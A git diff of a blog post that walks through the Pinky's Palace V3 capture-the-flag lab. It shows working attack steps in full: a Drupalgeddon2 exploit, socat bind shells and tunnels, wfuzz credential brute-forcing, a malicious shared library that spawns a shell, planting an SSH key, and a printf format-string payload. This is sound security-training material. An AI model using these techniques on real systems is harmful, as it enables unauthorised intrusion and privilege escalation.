@@ -3,20 +3,16 @@ published: false
 ---
 It has been a while since we posted. We have not stopped, but rather moved away from Twitch and over to [youtube](https://www.youtube.com/channel/UCBE5zF0VuDwn2-cAMNBJvkA)! 
 
-​
 
 This one took us a while to complete and was split over a series of four videos. Let's dive in.
 
-​
 
 Back to CTF’s this ~week~ month we are working on Pinky’s Palace V3! We have completed v2 in a previous stream and looking forward to what this one has in store.
 
-​
 ![331153416.png]({{site.baseurl}}/Images/pp3/331153416.png)
 
 ## Stream 1
-​
-https://www.youtube.com/watch?v=M4rf2SRvuvM
+[https://www.youtube.com/watch?v=M4rf2SRvuvM](https://www.youtube.com/watch?v=M4rf2SRvuvM)
 
 Starting off as we always do with an nmap scan:
 
@@ -106,11 +102,9 @@ Nmap done: 1 IP address (1 host up) scanned in 12.68 seconds
 
 ```
 
-​
 
 Starting from the top we can see that we have FTP open on 21 with anonymous login allowed. We also have SSH on a custom port 5555 as well as a Drupal 7 site on 8000. 
 
-​
 
 We should know just from looking at those results that the Drupal site should be vulnerable to at least one Drupalgeddon. So to be thorough we take a look at the FTP:
 
@@ -192,7 +186,6 @@ ftp>
 
 We have spoken in the past about the differences between passive and active. We notice initially that running commands in active (default) don’t work very well so we reconnect in passive mode.
 
-​
 
 We then pull the `WELCOME` file but also notice that there is a sneaky `…` folder that is not a default thing. So we head in there to see whats going on.
 
@@ -248,11 +241,9 @@ local: firewall.sh remote: firewall.sh
 
 ```
 
-​
 
 In the `…` folder we have another hidden folder called `.bak` and in there we find an interesting looking file we grab as well. `firewall.sh`.
 
-​
 
 Taking a look. We see what we expected from the WELCOME file.
 
@@ -262,25 +253,20 @@ root@kali: cat WELCOME
 
 Welcome to Pinky's Palace V3
 
-​
 
 Good Luck ;}
 
-​
 
 I encourage you to be creative, try and stay away from metasploit and pre-made tools.
 
 You will learn much more this way!
 
-​
 
 ~Pinky
 
-​
 
 ```
 
-​
 
 Then in our firewall file we have:
 
@@ -292,7 +278,6 @@ root@kali: cat firewall.sh
 
 #FIREWALL
 
-​
 
 iptables -A OUTPUT -o eth0 -p tcp --tcp-flags ALL SYN -m state --state NEW -j DROP
 
@@ -300,47 +285,33 @@ ip6tables -A OUTPUT -o eth0 -p tcp --tcp-flags ALL SYN -m state --state NEW -j D
 
 ```
 
-​
-
-​
 
 Interestingly we see that it is a script to set up some firewall rules. Reading the commands, it is setting up the local firewall to block all outgoing TCP traffic on both ipv4 and ipv6.
 
-​
 
 A quick explanation, IPTables uses the concept of a ‘chain’, which is a series of processing steps a given packet has to go through. The OUTPUT chain is for all outbound IP traffic. -A defines the chain we want to add the rule to, -o is the interface we want the rule to apply to. --tcp--flags contains two arguments. The first argument is which TCP flags will trigger this rule (All of them, rather than just SYN, ACK, RST etc…), and the second argument is which flags must be set for the rule to apply. In this case all packets will be checked (based on their flags), but only the SYN flag should be set for this rule to trigger. 
 
-​
 
 -m state allows for using the state of a TCP connection in decision making, in our case --state is looking for new TCP sessions. -j means ‘jump’, or which chain to jump packet processing to. In this case DROP is a special chain that drops the packet.
 
-​
 
 The above rule basically prevents any new connections from leaving the server, however inbound connections will work, as the SYN, ACK/SYN, ACK process for TCP connections will still work, as the first outbound packet from the server in that case has the ACK and SYN flags set together, which won’t trigger this rule.
 
-​
 
 Looks like that’s it from the FTP. So time to dive into the fun stuff.
 
-​
 
 Browsing to the site we get a standard Drupal site and the `CANGELOG.txt` file confirms that it is an older version of Drupal we know is vulnerable to Drupalgeddon.
 
-​
 
 ![331218961.png]({{site.baseurl}}/Images/pp3/331218961.png)
 
-​
 
 CHANGELOG.txt:
 
-​
 
 ![331186195.png]({{site.baseurl}}/Images/pp3/331186195.png)
 
-​
-
-​
 
 Droopescan doesn’t reveal much we didn’t already know:
 
@@ -354,19 +325,16 @@ root@kali: droopescan scan drupal -u 192.168.1.148:8000
 
     garland http://192.168.1.148:8000/themes/garland/
 
-​
 
 [+] Possible interesting urls found:
 
     Default changelog file - http://192.168.1.148:8000/CHANGELOG.txt
 
-​
 
 [+] Possible version(s):
 
     7.57
 
-​
 
 [+] Plugins found:
 
@@ -378,7 +346,6 @@ root@kali: droopescan scan drupal -u 192.168.1.148:8000
 
 ```
 
-​
 
 So we move on to finding an actual exploit.
 
@@ -482,7 +449,6 @@ Shellcodes: No Result
 
 ```
 
-​
 
 However two options are appealing:
 
@@ -494,11 +460,9 @@ Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)
 
 ```
 
-​
 
 These are both for the drupalgeddon2 vulnerability, which allow bash command injection from an un-authenticated context, however the Python PoC doesn’t work on our specific version of Drupal. Pulling apart the ruby version it appears there are a number of checks made to understand the specific vulnerability that will be used to gain execution. We did have plans to re-implement this, however given time (and laziness) we didn’t. This script does 3 key things though:
 
-​
 
 1. Find out exactly how the specific instance of drupal is vulnerable, and test it.
 
@@ -506,7 +470,6 @@ These are both for the drupalgeddon2 vulnerability, which allow bash command inj
 
 3. Connect to the PHP reverse shell and provide a helpful wrapper around it’s use.
 
-​
 
 So if we run our script:
 
@@ -650,27 +613,21 @@ ruby: warning: shebang line ending with \r may cause problems
 
 ```
 
-​
 
 Running this in verbose we can actually see the URLs it generated to abuse this vulnerability.
 
-​
 
 Great, we now have an average shell.
 
-​
 
 The next step is figuring out how to get a less crap shell. 
 
-​
 
 Reverse shells aren’t going to work here because they rely on being able to communicate out from the server, instead we want a bind shell. 
 
-​
 
 A bind shell is effectively no different from SSH or Telnet. You connect to the server and then send it commands, rather than the server connecting to you and you sending it commands. A bind shell works where the reverse shell doesn’t because of the firewall rules we discovered earlier. These rules block all new outgoing connections (SYN). With a reverse shell, we as the attacker have the listener waiting for a connection, and we tell the target to connect out to us. In the case of a bind shell we set the listener up on the target, and it waits for us to connect in.
 
-​
 
 There are a few options, however one of the limiting factors is the timeout of the shell. Installed on the server is `socat`, `python`, `perl` and `php`. All things we can use for bind shells. We chose `socat`, a tool that is similar to netcat in operation. A first attempt at using socat looks like this:
 
@@ -688,11 +645,9 @@ nc <server IP> 1337
 
 You will find that gets you a shell, but you need to upgrade it with `python -c 'import pty;pty.spawn("/bin/bash”)'`
 
-​
 
 Note that on the server (using the fake shell) we have to use `nohup`. nohup is a simple utility that prevents processes from closing when a terminal ends. Our PHP reverse shell will sit there for ~30 seconds before timing out, so without nohup all your shells only last 30 seconds, however it does leave nohup.out files on the file system, where shell output is written.
 
-​
 
 A better alternative is to use some extra arguments in socat:
 
@@ -708,47 +663,36 @@ socat FILE:`tty`,raw,echo=0 TCP:<server IP>:1337
 
 ```
 
-​
 
 This drops us straight in to a full shell without needing to upgrade. 
 
-​
 
 Let’s break this down:
 
-​
 
 `TCP-LISTEN:4444` - Simply telling socat to listen on port 1337 and wait for an incoming connection.
 
-​
 
 `reuseaddr` - Allows other sockets to bind to an address even if parts of it (e.g. the local port) are already in use by socat
 
-​
 
 `fork` - This is what gives us the stable shell. After establishing a connection, socat handles its channel in a child process. This child process is no longer limited to the 30 sec web timeout.
 
-​
 
 `EXEC:…` - Binds the binaries to the channel so that they are executed when a connection is made. This is what gives us our shell on connection. But it could just as easily run a script or perform a task without us getting a response. For example `EXEC:'echo hello /tmp/test.txt'`
 
-​
 
 Then from the attacker side:
 
-​
 
 `FILE:`tty`,raw,echo=0` - The socat way of upgrading the shell to a fully interactive one passing through our sigints etc. allowing us to up arrow through command history, and ctrl+c etc without killing the shell.
 
-​
 
 `TCP:<server IP>:1337` - Simply the connection details it should attempt.
 
-​
 
 We are now the www-data user on the server, yay!
 
-​
 
 Poking around, we see that there are a few different users on the box:
 
@@ -856,23 +800,18 @@ udp        0      0 0.0.0.0:68              0.0.0.0:*                           
 
 ```
 
-​
 
 There are some things listening on local only ports (127.0.0.1). This means that they are only accessible on the local server and is why our remote netcat scan didn’t pick them up.
 
-​
 
 Port 3306 is the local database server that we took a look at, but ultimately don’t find anything useful in there. Only Drupal user hash which match those found in the drupal config files.
 
-​
 
 Port 80 we can assume is a web server. We can’t see details of the PID running it, which means that it is running as a different user.
 
-​
 
 Port 65334 is an unknown. Something is running on that port, but it could be anything. We need to figure out what it is.
 
-​
 
 Moving to our processes. We know that 80 is a web server, but we don’t know who is running it. Luckily there are ways to find out:
 
@@ -942,7 +881,6 @@ www-data   917  0.0  0.1   5988  2856 pts/0    R+   00:16   0:00 ps -auxw
 
 ```
 
-​
 
 We know that www-data is the user running the nginx server on port 8000 out of the /var/www/html folder, but this command shows us that the pinksec user is running an apache2 server. Apache uses VirtualHosts to run multiple websites on the same server, let’s go and look at the apache config and figure out where this site is being hosted from.
 
@@ -968,7 +906,6 @@ www-data@pinkys-palace:/etc/apache2/sites-available$ cat 000-default.conf
 
         #ServerName www.example.com
 
-​
 
         ServerAdmin pinkyadmin@localhost
 
@@ -994,13 +931,11 @@ www-data@pinkys-palace:/etc/apache2/sites-available$ cat 000-default.conf
 
         #LogLevel info ssl:warn
 
-​
 
         ErrorLog ${APACHE_LOG_DIR}/error.log
 
         CustomLog ${APACHE_LOG_DIR}/access.log combined
 
-​
 
         # For most configuration files from conf-available/, which are
 
@@ -1038,11 +973,9 @@ www-data@pinkys-palace:/etc/apache2/sites-available$ cat 000-default.conf
 
 ```
 
-​
 
 We get a double whammy in the default apache config file. We can see from this that there is a website running on port 80 from the `/home/pinksec/html` folder. We also can see that the port 65334 is another website running out of the `/home/pinksec/database` folder. Neither of which we have access to as www-data.
 
-​
 
 If we wanted to be masochist’s we could sit here and wget/curl everything locally from our shell:
 
@@ -1060,15 +993,12 @@ Length: 820 [text/html]
 
 Saving to: 'index.html'
 
-​
 
 index.html          100%[===================>]     820  --.-KB/s    in 0s      
 
-​
 
 2020-02-03 00:27:04 (251 MB/s) - 'index.html' saved [820/820]
 
-​
 
 www-data@pinkys-palace:/tmp$ cat index.html 
 
@@ -1158,7 +1088,6 @@ www-data@pinkys-palace:/tmp$ cat index.html
 
 ```
 
-​
 
 But we can make this easier though the use of a tunnel. We have used SSH before to generate an SSH tunnel and lucky for us, `socat` has the ability to do the same.
 
@@ -1170,11 +1099,9 @@ www-data@pinkys-palace:/tmp$ socat tcp-listen:8002,reuseaddr,fork tcp:localhost:
 
 ```
 
-​
 
 The additional `tcp:localhost:80` argument this time is what creates our tunnel through. So now when anyone connects to the bind on port 8001 and 8002 socat will pass the traffic back and forth to the localhost ports 80 and 65334.
 
-​
 
 So now if we look at our netstat on the target:
 
@@ -1216,23 +1143,18 @@ udp        0      0 0.0.0.0:68              0.0.0.0:*                           
 
 ```
 
-​
 
 And we have both ports 8001 and 8002 available to us on the entire network, tunneling to ports 80 and 65334. This means that now we can use our local kali machine to access these websites:
 
-​
 
 ![346161170.png]({{site.baseurl}}/Images/pp3/346161170.png)
 
-​
 
-​
 
 ![346226713.png]({{site.baseurl}}/Images/pp3/346226713.png)
 
-​
 ## Stream 2
-https://www.youtube.com/watch?v=XyE5bO1gp1k
+[https://www.youtube.com/watch?v=XyE5bO1gp1k](https://www.youtube.com/watch?v=XyE5bO1gp1k)
 
 Taking a quick stab at the login form we notice that default credentials don’t work and even if they did, we don’t know the 5 digit pin. We also try some SQL Injection but that also doesn’t seem to get us anywhere.
 
@@ -1280,7 +1202,6 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 
 ```
 
-​
 
 Browsing to /pwds/db we get a list of what looks like potential passwords:
 
@@ -1324,7 +1245,6 @@ pinksec133754
 
 ```
 
-​
 
 The closest thing we have to user names is the passwd file. Let’s grab those so that we have two lists. `pwds.txt` and `users.txt`
 
@@ -1346,19 +1266,15 @@ dpink
 
 ```
 
-​
 
 Most of these come from the passwd file. But we also uncovered the `pinkadmin` username from the drupal site and `dpink` was the drupal database user.
 
-​
 
 Using Burp we capture a login request and see that we get a standard error response:
 
-​
 
 ![346161188.png]({{site.baseurl}}/Images/pp3/346161188.png)
 
-​
 
 Using the word list generator tool crunch we can generate a list of every possible pin from 00000 to 99999:
 
@@ -1402,11 +1318,9 @@ root@kali: head pins.txt
 
 ```
 
-​
 
 We now have three word lists to cover the three inputs we need. 
 
-​
 
 Hydra is a touchy beast, so we start by trying wfuzz:
 
@@ -1414,11 +1328,9 @@ Hydra is a touchy beast, so we start by trying wfuzz:
 
 root@kali: wfuzz -w users.txt -w pwds.txt -w pins.txt -c -d "user=FUZZ&pass=FUZ2Z&pin=FUZ3Z" http://192.168.1.148:8001/login.php
 
-​
 
 Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
 
-​
 
 ********************************************************
 
@@ -1426,13 +1338,11 @@ Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly 
 
 ********************************************************
 
-​
 
 Target: http://192.168.1.148:8001/login.php
 
 Total requests: 7200000
 
-​
 
 ===================================================================
 
@@ -1440,7 +1350,6 @@ ID           Response   Lines    Word     Chars       Payload
 
 ===================================================================
 
-​
 
 000000009:   200        0 L      6 W      45 Ch       "root - FJ(J#J(R#J - 11119"                                                               
 
@@ -1480,7 +1389,6 @@ ID           Response   Lines    Word     Chars       Payload
 
 ```
 
-​
 
 We can see from this that all our failed responses have a 200 response code, 6 words and 45 characters. So we need to hide those to help make our terminal clear. We let that run for way longer than we should have before realising that it needs to make **7.2 Million requests…** So lets limit it to just usernames and passwords and see if we get anything:
 
@@ -1488,11 +1396,9 @@ We can see from this that all our failed responses have a 200 response code, 6 w
 
 root@kali: wfuzz -t 250 --hh 45 -w users.txt -w pwds.txt -c -d "user=FUZZ&pass=FUZ2Z&pin=12345" http://192.168.1.148:8001/login.php 
 
-​
 
 Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
 
-​
 
 ********************************************************
 
@@ -1500,13 +1406,11 @@ Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly 
 
 ********************************************************
 
-​
 
 Target: http://192.168.1.148:8001/login.php
 
 Total requests: 126
 
-​
 
 ===================================================================
 
@@ -1514,7 +1418,6 @@ ID           Response   Lines    Word     Chars       Payload
 
 ===================================================================
 
-​
 
 000000014:   200        0 L      6 W      41 Ch       "pinkadmin - AaPinkSecaAdmin4467"                                                      
 
@@ -1532,33 +1435,26 @@ Requests/sec.: 37.93327
 
 Bingo! The credentials `pinkadmin:AaPinkSecaAdmin4467` give us a different response to the rest! 
 
-​
 
 Looking in Burp to see why this is different and why it would have been impossible to notice in a browser as a human:
 
-​
 
 ![346226729.png]({{site.baseurl}}/Images/pp3/346226729.png)
 
-​
 
 Burp reveals that Pinky has sneakily left off the closing `</p>` tag which will change the response length, without changing what the response visually looks like.
 
-​
 
 We can now hard-code the username and password in and run wfuzz again with just the pins to see if we can figure that out as well.
 
-​
 
 ```
 
 root@kali wfuzz -t 250 --hh 41 -w pins.txt -c -d "user=pinkadmin&pass=AaPinkSecaAdmin4467&pin=FUZZ" http://192.168.1.148:8001/login.php
 
-​
 
 Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
 
-​
 
 ********************************************************
 
@@ -1566,13 +1462,11 @@ Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly 
 
 ********************************************************
 
-​
 
 Target: http://192.168.1.148:8001/login.php
 
 Total requests: 100000
 
-​
 
 ===================================================================
 
@@ -1580,7 +1474,6 @@ ID           Response   Lines    Word     Chars       Payload
 
 ===================================================================
 
-​
 
 000003771:   200        0 L      6 W      45 Ch       "14881"                                                                                   
 
@@ -1618,7 +1511,6 @@ ID           Response   Lines    Word     Chars       Payload
 
 ```
 
-​
 
 And we get a redirect when we use the pin 55849. Time to head over to the site and try all the creds.
 
@@ -1637,7 +1529,6 @@ root@kali: socat FILE:`tty`,raw,echo=0 TCP:192.168.1.148:1338
 
 pinksec@pinkys-palace:/home/pinksec/html/PinkysC0n7r0lP4n31337$ 
 ```
-​
 We are pinksec!
 
 Nothing in the web files to help us, but in the users home directory we do find an interesting binary:
@@ -1676,7 +1567,7 @@ drwx------ 5 pinksec           pinksec           4096 May 14  2018 ..
 
 pinksec@pinkys-palace:/home/pinksec$ 
 ```
-​
+
 We notice specifically that this has the SUID bit set for a user and group that is not us. Running the application, not much seems to happen:
 
 ```
@@ -1698,11 +1589,10 @@ Flags Added: -h
 
 Soon to be host of pinksec web application.
 ```
-​
 
 The flags added is interesting. We try adding garbage to it and see what happens:
 
-```​
+```
 pinksec@pinkys-palace:/home/pinksec/bin$ ./pinksecd -thoseguys
 
 [+] PinkSec Daemon [+]
@@ -1713,7 +1603,7 @@ Flags Added: -thoseguys
 
 Soon to be host of pinksec web application.
 ```
-​
+
 Time to do some reverse engineering. The file is small enough that we can base64 copy/paste it to our local machine (A better alternative is to copy the file ot the web server and just direct download it):
 ```
 pinksec@pinkys-palace:/home/pinksec/bin$ base64 pinksecd 
@@ -1728,7 +1618,7 @@ AAAdAAAALwAAAAQAAAAQAAAACQAAAAMAAAAAAAAAAAAAAPgUAAB5AgAAAAAAAAAAAAABAAAAAAAA
 
 ABEAAAADAAAAAAAAAAAAAABxFwAACgEAAAAAAAAAAAAAAQAAAAAAAAA=
 ```
-​
+
 
 then on our local machine:
 
@@ -1749,7 +1639,7 @@ root@kali: file pinksecd
 
 pinksecd: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=f075e983506c107b4e5fb6ecc19cc2bedc763092, not stripped
 ```
-​
+
 
 Attempting to run the file locally we get an error that it cannot find a shared object library:
 
@@ -1758,13 +1648,11 @@ root@kali: ./pinksecd
 
 ./pinksecd: error while loading shared libraries: libpinksec.so: cannot open shared object file: No such file or directory
 ```
-​
 
-​
 
 Looking for it on the target machine we find the shared object and can copy that off as well:
 
-​
+
 ```
 pinksec@pinkys-palace:/home/pinksec/bin$ find / -name libpinksec.so 2>/dev/null
 
@@ -1877,11 +1765,11 @@ pinksec@pinkys-palace:/home/pinksec$ ls -la /lib/libpinksec.so
 
 -rwxrwxrwx 1 root root 7136 May 14  2018 /lib/libpinksec.so
 ```
-​
+
 De-compiling the existing object we see there are three functions we need to replicate:
 
 In the pinksecd binary we notice that the psbanner function is the first to be called, so we will replace this function with our malicious code and leave the rest doing nothing.
-​
+
 ## Stream 3
 https://www.youtube.com/watch?v=o9Fl4RNzHDU
 
@@ -1906,26 +1794,25 @@ void psbanner()
     system("/bin/bash", NULL, NULL);
 }
 ```
-​
 
 We know that the binary has the SUID bit set but it is not owned by root. We need to make sure we use the right user and group ids in our exploit code so that we become the SUID user (pinksecmanagement) We pull these ids from the /etc/passwd file:
 
 ```
 pinksecmanagement:x:1002:1002::/home/pinksecmanagement:/bin/bash
 ```
-​
+
 We compile the source code with gcc:
 
 ```
 root@kali: gcc -shared -fPIC -m32 -o libpinksec.bad.so libpinksec.bad.so.c
 ```
-​
+
 Note. If you run into compile issues on a 64 bit Kali instance you need to install gcc-multilib:
-​
+
 ```
 root@kali: apt-get install gcc-multilib
 ```
-​
+
 and then copy it to the box using base64.
 
 ```
@@ -1941,7 +1828,6 @@ AAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAEQAAAAMAAAAAAAAAAAAAAAAAAAAAAAAANTcA
 
 AAAAAADxAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAA==
 ```
-​
 
 Then on our bind shell:
 
@@ -1954,7 +1840,6 @@ AAAAAADxAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAA==' > libpinksec.bad.so.b64
 
 pinksec@pinkys-palace:/home/pinksec$ base64 -d libpinksec.bad.so.b64 > libpinksec.bad.so
 ```
-​
 
 Now we make a backup of the original and replace it with our one.
 
@@ -1970,11 +1855,9 @@ bash-4.4$ whoami
 
 pinksec
 ```
-​
 
 Our exploit works but we did not inherit pinksecmanagment permissions.
 
-​
 We fall back to running some commands directly in our exploit script:
 ```
 
@@ -1992,7 +1875,7 @@ void psbanner()
 ```
 
 Running this we get the expected output:
-​
+
 ```
 pinksec@pinkys-palace:/home/pinksec/bin$ ./pinksecd -d
 
@@ -2000,7 +1883,7 @@ pinksecmanagement
 
 Soon to be host of pinksec web application.
 ```
-​
+
 
 Looks like there is something with our /bin/bash that is losing or ignoring the suid bit. It could also be the case that bash is falling back to the euid instead or not honoring the sticky bit.
 
@@ -2013,7 +1896,7 @@ $ whoami
 
 pinksecmanagement
 ```
-​
+
 `sh` is not the greatest of shells so we try to upgrade it with our socat bind shell (making sure to swap out `bash` with `sh` in our socat command):
 
 ```
@@ -2040,7 +1923,7 @@ $ whoami
 
 pinksecmanagement
 ```
-​
+
 
 Attempting to upgrade our shell to /bin/bash we get an interesting error:
 
@@ -2071,10 +1954,10 @@ OSError: out of pty devices
 
 ```
 
-​But looking at the passwd file when the user pinksecmanagement logs in, they get a /bin/bash shell. Our socat shell has been good to us so far, but for pinksecmanagement it has become tedious. 
+But looking at the passwd file when the user pinksecmanagement logs in, they get a /bin/bash shell. Our socat shell has been good to us so far, but for pinksecmanagement it has become tedious. 
 
 We haven’t touched SSH yet, so let’s see if we can log in with just an SSH private key like we have on so many other boxes.
-```​
+```
 
 root@kali: ssh-keygen -f thoseguys
 
@@ -2116,7 +1999,6 @@ The key's randomart image is:
 
 +----[SHA256]-----+
 ```
-​
 
 Then on our sh shell:
 ```
@@ -2126,7 +2008,7 @@ $ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKqOfyY0GYq9XP8rftHarWcvFv5Y4YGeuX
 
 $ chmod 600 /home/pinksecmanagement/.ssh/authorized_keys
 ```
-​
+
 
 Now we can try logging in directly as pinksecmanagement:
 
@@ -2169,7 +2051,7 @@ pinksecmanagement@pinkys-palace:~$ find / -perm -4000 2>/dev/null
 /bin/mount
 
 ```
-​
+
 Looking at the permissions on the file:
 
 ```
@@ -2177,7 +2059,7 @@ pinksecmanagement@pinkys-palace:~$ ls -la /usr/local/bin/PSMCCLI
 
 -rwsrwx--- 1 pinky pinksecmanagement 7396 May 14  2018 /usr/local/bin/PSMCCLI
 ```
-​
+
 Running this binary looks like it just takes whatever argument we give it:
 
 ```
@@ -2200,7 +2082,7 @@ pinksecmanagement@pinkys-palace:~$ cp /usr/local/bin/PSMCCLI ~/
 
 root@kali: scp -i thoseguys -P 5555 pinksecmanagement@192.168.1.148:/home/pinksecmanagement/PSMCCLI ./
 ```
-​
+
 We start off by trying to buffer overflow with pattern create to attempt a buffer overflow, but a pattern of 100,000 is handled perfectly fine, so it probably isn’t that.
 
 However printf() is called when we look at the code:
@@ -2243,7 +2125,6 @@ kali :: /data/CTFs/pinkys3 # ./PSMCCLI %s                                       
 
 [+] Args: lm
 ```
-​
 
 Looking at the [printf() man page](http://www.cplusplus.com/reference/cstdio/printf/) we note that this function has a dynamic number of arguments meaning that we can pass it as many arguments as we want. Also in the reference page is the values of the acceptable format strings. The first interesting one is `%p` which prints pointer address.
 
@@ -2266,7 +2147,7 @@ pinksecmanagement@pinkys-palace:/tmp$ /usr/local/bin/PSMCCLI "$(python -c 'impor
 
 [+] Args: AAAA 0xbffff4d4 0xb7ffed00 0x80484a7 (nil) (nil) 0xbffff428 0x8048530 0xbffff60d 0xbffff4d4 0xbffff4e0 0x80484f8 0xbffff440 (nil) (nil) 0xb7e2f286 0x2 0xb7fca000 (nil) 0xb7e2f286 0x2 0xbffff4d4 0xbffff4e0 (nil) (nil) (nil) 0xb7fca000 0xb7fffc0c 0xb7fff000 (nil) 0x2 0xb7fca000 (nil) 0xdfdc72de 0xe5d07ece (nil) (nil) (nil) 0x2 0x80483a0 (nil) 0xb7ff0710 0xb7e2f199 0xb7fff000 0x2 0x80483a0 (nil) 0x80483c1 0x80484e4 0x2 0xbffff4d4 0x8048550 0x80485b0 0xb7feb070 0xbffff4cc 0xb7fff920 0x2 0xbffff5f6 0xbffff60d (nil) 0xbffff86a 0xbffffe26 0xbffffe5c 0xbffffe6d 0xbffffe7e 0xbffffe95 0xbffffe9e 0xbffffebb 0xbffffedf 0xbffffef2 0xbfffff13 0xbfffff27 0xbfffff37 0xbfffff3f 0xbfffff59 0xbfffff78 0xbfffffb6 0xbfffffcf (nil) 0x20 0xb7fd9cd0 0x21 0xb7fd9000 0x10 0xf8bfbff 0x6 0x1000 0x11 0x64 0x3 0x8048034 0x4 0x20 0x5 0x9 0x7 0xb7fdb000 0x8 (nil) 0x9 0x80483a0 0xb 0x3ea 0xc 0x3e8 0xd 0x3ea 0xe 0x3ea 0x17 0x1 0x19 0xbffff5db 0x1f 0xbfffffe5 0xf 0xbffff5eb (nil) (nil) (nil) (nil) (nil) 0x31000000 0x79da2401 0x2ed0901a 0x4606fdbd 0x699833d2 0x363836 (nil) 0x752f0000 0x6c2f7273 0x6c61636f 0x6e69622f 0x4d53502f 0x494c4343 0x41414100 0x70252041 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520
 ```
-​
+
 Eventually we start to see our 414141 But we are missing one and it is not the complete memory address we were expecting.
 
 If we add another character (such as a B ) we can align the addresses to look correct:
@@ -2284,7 +2165,7 @@ pinksecmanagement@pinkys-palace:/tmp$ /usr/local/bin/PSMCCLI 'AAAABBB%135$p'
 
 [+] Args: AAAABBB0x41414141
 ```
-​
+
 Because we were adding two space characters to our initial input to make make the printed output formatted correctly (hehe) we need to add a couple of B’s to realign our A’s. 
 
 Now we need to turn this into something. printf() has a %n argument, that is:
@@ -2342,10 +2223,10 @@ pinksecmanagement@pinkys-palace:/tmp/thoseguys$ cat getenvaddr.c
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-​
+
 int main(int argc, char *argv[]) {
         char *ptr;
-​
+
         if(argc < 3) {
                 printf("Usage: %s <environment variable> <target program name>\n", argv[0]);
                 exit(0);
@@ -2359,7 +2240,7 @@ pinksecmanagement@pinkys-palace:/tmp/thoseguys$ gcc -o getenvaddr getenvaddr.c
 
 pinksecmanagement@pinkys-palace:/tmp/thoseguys$
 ```
-​
+
 The next step is to find a suitable shellcode. Looking at [shell-storm](http://shell-storm.org/shellcode/) because we are not concerned about the length anymore, we should be able to use any `/bin/sh` shellcode (remember from earlier that we can’t run `/bin/bash`)
 
 We went with a basic [25 byte execve("/bin/sh") shellcode](http://shell-storm.org/shellcode/files/shellcode-585.php)
@@ -2379,7 +2260,6 @@ thoseguys will be at 0xbfffff74
 
 We almost have everything we need! FEW!
 
-​
 Just to recap. We know:
 
 * We control the addresses at the offsets of 136 and 137
@@ -2429,7 +2309,6 @@ Our final exploit should look something like:
 ```
 $(python -c 'import sys; sys.stdout.write("\x1c\xa0\x04\x08\x1e\xa0\x04\x08CC%65386u%135$0hn%49291u%136$0hn")')
 ```
-​
 
 > DON’T be dumb like me and forget the %0hn…. I wasted about an hour using just %hn and wondering why my offsets were out… #facepalm
 
@@ -2467,11 +2346,11 @@ on our local machine:
 ```
 root@kali: ssh -i thoseguys -p 5555 pinky@192.168.1.148
 Linux pinkys-palace 4.9.0-6-686 #1 SMP Debian 4.9.82-1+deb9u3 (2018-03-02) i686
-​
+
 The programs included with the Debian GNU/Linux system are free software;
 the exact distribution terms for each program are described in the
 individual files in /usr/share/doc/*/copyright.
-​
+
 Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
 permitted by applicable law.
 Last login: Tue May 15 04:32:07 2018 from 172.19.19.251
@@ -2486,12 +2365,12 @@ During our standard local enumeration we notice that the user has some sudo perm
 pinky@pinkys-palace:~$ sudo -l
 Matching Defaults entries for pinky on pinkys-palace:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
-​
+
 User pinky may run the following commands on pinkys-palace:
     (ALL) NOPASSWD: /sbin/insmod
     (ALL) NOPASSWD: /sbin/rmmod
 ```
-​
+
 `insmod` and `rmmod` are applications used to add or remove kernel modules. 
 
 Linux kernel modules are applications or pieces of code that get loaded and executed by the kernel on demand. 
@@ -2508,13 +2387,13 @@ Our first attempt looks something like:
 ```
 #include <linux/module.h>  
 #include <linux/kernel.h>  
-​
+
 int init_module(void)
 {
    printk("Those Guys say hello!\n");
    return 0;
 }
-​
+
 void cleanup_module(void)
 {
   printk(KERN_ALERT "Bye Those Guys!\n");
@@ -2550,13 +2429,13 @@ pinky@pinkys-palace:/tmp$ uname -r
 4.9.0-6-686
 pinky@pinkys-palace:/tmp$ cat Makefile 
 obj-m += hello.o
-​
+
 all:
         make -C /lib/modules/4.9.0-6-686/build M=$(PWD) modules
 clean:
         make -C /lib/modules/4.9.0-6-686/build M=$(PWD) clean
 ```
-​
+
 The `obj-m` ensures that it is treated as a [kernel makefile](https://stackoverflow.com/a/10950074) ensuring that `hello.o` is compiled as a kernel module.
 
 The `M=$(pwd)` simply tells make to return us back to the current working directory (/tmp) once it is finished compiling. I think it is because of this argument that we need to call the file Makefile (capital M) without the capital M in the file name the make fails. [Reference](https://stackoverflow.com/a/24180213).
